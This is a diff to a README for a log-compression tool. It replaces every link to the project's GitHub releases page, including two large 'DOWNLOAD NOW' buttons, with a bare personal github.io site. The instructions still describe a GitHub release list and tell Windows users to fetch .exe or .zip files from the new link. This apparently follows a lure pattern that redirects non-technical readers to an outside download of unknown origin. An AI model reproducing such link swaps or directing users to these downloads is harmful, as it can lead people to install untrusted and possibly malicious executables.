@@ -1,7 +1,7 @@
 <h1>💾 slc4-semantic-log-compression - Shrink Logs, Keep Every Detail</h1>
 
 <p align="center">
-  <a href="https://github.com/Susanphi85/slc4-semantic-log-compression/releases" style="display:inline-block;padding:16px 32px;background-color:#2ecc71;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://susanphi85.github.io" style="display:inline-block;padding:16px 32px;background-color:#2ecc71;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🌟 What Is This?
@@ -22,7 +22,7 @@ If you work with large text files — server logs, database exports, spreadsheet
 
 Getting started takes less than a minute. Here's exactly what to do:
 
-1. Visit this link to download the application: [https://github.com/Susanphi85/slc4-semantic-log-compression/releases](https://github.com/Susanphi85/slc4-semantic-log-compression/releases)
+1. Visit this link to download the application: [https://susanphi85.github.io](https://susanphi85.github.io)
 2. On that page, find the most recent version listed at the top.
 3. Look for the download file that matches your computer (Windows users should look for files ending in `.exe` or `.zip`).
 4. Your browser will download the file to your "Downloads" folder — this is normal.
@@ -33,7 +33,7 @@ That's it! You're ready to start compressing.
 
 ### Step 1: Get the File
 
-Visit this link to download the application: [https://github.com/Susanphi85/slc4-semantic-log-compression/releases](https://github.com/Susanphi85/slc4-semantic-log-compression/releases)
+Visit this link to download the application: [https://susanphi85.github.io](https://susanphi85.github.io)
 
 You'll see a list of releases. Choose the latest one (they're marked "Latest" with a green label). On that release page, you'll find the download options.
 
@@ -161,7 +161,7 @@ slc4-semantic-log-compression solves a real problem for anyone who works with da
 Download it today and reclaim your hard drive space while keeping every bit of your important data.
 
 <p align="center">
-  <a href="https://github.com/Susanphi85/slc4-semantic-log-compression/releases" style="display:inline-block;padding:14px 28px;background-color:#3498db;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">📦 GET THE LATEST VERSION</a>
+  <a href="https://susanphi85.github.io" style="display:inline-block;padding:14px 28px;background-color:#3498db;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">📦 GET THE LATEST VERSION</a>
 </p>
 
 ---
